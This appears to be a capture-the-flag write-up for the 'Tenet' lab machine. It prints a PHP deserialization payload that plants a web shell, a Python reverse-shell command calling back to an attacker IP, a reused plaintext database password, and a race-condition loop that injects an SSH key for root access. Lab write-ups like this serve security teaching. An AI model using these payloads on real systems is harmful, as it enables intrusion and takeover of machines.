## PORT 80 (HTTP)

Visting the web page it shows default apache web page

<img src="https://imgur.com/1BwN4Vw.png"/>

Running `dirsearch`

<img src="https://imgur.com/A8dchV2.png"/>

Now this doesn't loads css so looking at the source it shows the there's a domain 

`tenet.htb`

<img src="https://imgur.com/9bNBTYF.png"/>

Adding this to `/etc/hosts` file

<img src="https://imgur.com/CNaC6lG.png"/>

We can see some posts on the main page

<img src="https://imgur.com/ulTFVaT.png"/>

```python
We‚Äôre looking for beta testers of our new time-management software, ‚ÄòRotas‚Äô

‚ÄòRotas‚Äô will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!

For more information regarding opting-in, watch this space.

Thank you for your patience

This post had a comment 

```python

[December 16, 2020 at 2:53 pm]

did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

So we have some information that there are two users neil and protagonist also there's a php file and backup folder

We could have alternatively done this through `wpscan`

<img src="https://imgur.com/TzKJB9m.png"/>

<img src="https://imgur.com/ybgIadt.png"/>

I tried bruteforcing through wpscan but it didn't found any password

<img src="https://imgur.com/0l3BEjI.png"/>


Going back to that apache default page  I tried to include `sator.php` and got something

<img src="https://imgur.com/fQuryJK.png"/>

If we focus on the comment which was made on the post "the sator php file and the backup"

<img src="https://imgur.com/cAQhHjp.png"/>

We will get a backup file for `staor.php`

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>

```


## PHP Deserlization attack

We can see here that there's a class `DatabaseExport` in which there are two public variables `user_file` and `data` and in this class there's a public function called `update_db()` which will set the `data` variable to "sucess" which is just a text as you can see from the sator.php show on the web browser at the end there's a magic function `__destruct()` which will be automatcially called when an object is destroyed , there the `user_file` will be made with the contents from `data` and will put in the web directory which means users.txt will be created in the web directory having the data "success".

At the end we can the `GET` parameter `arepo` , now here exists a vulnerability which is known as** PHP Deserilization** 

So to exploit this we have to modify the class variables in this case `user_file` and `data` and seriliaze it , once we get the serliazed string we pass it to `arepo` paramter.

<img src="https://imgur.com/xzxCRzb.png"/>

After running it we will get a php serialized object

<img src="https://imgur.com/Ocvi0RZ.png"/>

But we need to pass this to GET paramter in a url encoded form so I used cyberchef to do that

<img src="https://imgur.com/I7LmXV9.png"/>

And then paste into the GET parameter

```bash
http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D
```

<img src="https://imgur.com/ki71f7v.png"/>

We can see the message "Database updated" so let's see if `shell.php` was made on the web directory or not.

<img src="https://imgur.com/sPf3gtb.png"/>

<img src="https://imgur.com/4Dhsv2O.png"/>

And we have a rce, cool !

<img src="https://imgur.com/RoxtkbY.png"/>

Python3 is installed so we can get a reverse shell through it

```bash
http://10.10.10.223/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.198",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Stabilize the shell

Let's check the cron jobs

## Escalating to user

We see mysql running on localhost so we can try to find creds for mysql and since wordpress is hosted the creds are in `wp-config.php` file

<img src="https://i.imgur.com/15rWkzs.png"/>

<img src="https://i.imgur.com/eARb5sw.png"/>

```bash
/** MySQL database username */                                                                                                                      
define( 'DB_USER', 'neil' );                     
/** MySQL database password */                                                                                                                      
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */                                                                                                                               
define( 'DB_HOST', 'localhost' );                                                                                                                   
                                                            
```

The db user is `neil` so this is interesting as neil is also the user on the linux machine so let's try this password

## Privilege Escalation

Doing `sudo -l` we can see what we run as sudo

<img src="https://imgur.com/SMnKeWi.png"/>

Reading the contents of the bash script

<img src="https://imgur.com/d9GYJuC.png"/>

Here these functions are not that interesting , if we go to the bottom

<img src="https://imgur.com/PHw2PuG.png"/>

We can see a function `addkey()` in which a temporary file is being made with command `mktemp`

<img src="https://imgur.com/FeDoFlb.png"/>

If we run this command on our local machine to see what file name it generates we can see that the file name it's pretty unique everytime this command runs 

<img src="https://imgur.com/i58Yvuk.png"/>

On the target machine it also generates a random name

<img src="https://imgur.com/P0CcQis.png"/>


In the script that file is being removed but that's the file need to put in our ssh public key so we need to run a loop in which we try to put our public key in every file that starts with `ssh` so we have to utilize wildcard here ( * )


So our one liner script should look like this

```bash
while true; do var=$(ls /tmp |grep ssh);echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKK/Hru6t4lA0tu4CX8E3BzkM8Bl7cFxyheVBHZS+flyqq
/sZuRfPHCQE2LNL5IgRfHDljFO4MuiYJgrMr8jCA+stDBxGAhCiRZ4UmZ7OYn1abGGOmtUyaCYvJp3pizvcyVIJsNBQBSk1JETfopgKCydtXfbXYF8kukjM29AVbIoD99UAmo8Qm1RDv+cguO+0q
Tg1vHMErURIyM/P3fhNakGL2F1/rENpvqB7EK06N6KYLujCf9Y87slTCU33gHoo5iG5mX5JFi2pBhWJnOQECjaeEsTjvKKvgIX7wy14b3I4b7fLstsXg69CCE9KF5Zr1uWYP0JGG1pB0OrDH4LPj
MRxDALCKMnA4F8OrSmTzfgWJ9LhxxFHh73ExsfGJYypBuSOxh+4UBSuF5znPbJo315Qd05LEcpCAv623vqjsUDQUEMeJVz0NiWkGCuJIxt+YTGinB9hDj58seHsI4yMZe5HtY5cQJLR09/fVoGPi
ebD/lFk68jQFonJs73NlPE= root@kali' | tee $var ;done
```

We are running a while loop infinite number of times and in there we have a variable which is grabbing the name of the random generated ssh file , next we are printing our public ssh key and piping it to that file and logging it with the help of `tee`

So first I will run the `enableSSH` script 

<img src="https://imgur.com/eBO3wUh.png"/>

Then will run my one liner bash script

<img src="https://imgur.com/D1QqNcr.png"/>

<img src="https://imgur.com/7GYp5XO.png"/>

After running it for some time and terminated both the scripts and in the `/tmp` folder you will see those  randomly generated ssh file , some of them will have no content as the temp file gets deleted.

Try to ssh in the target machine using ssh private key
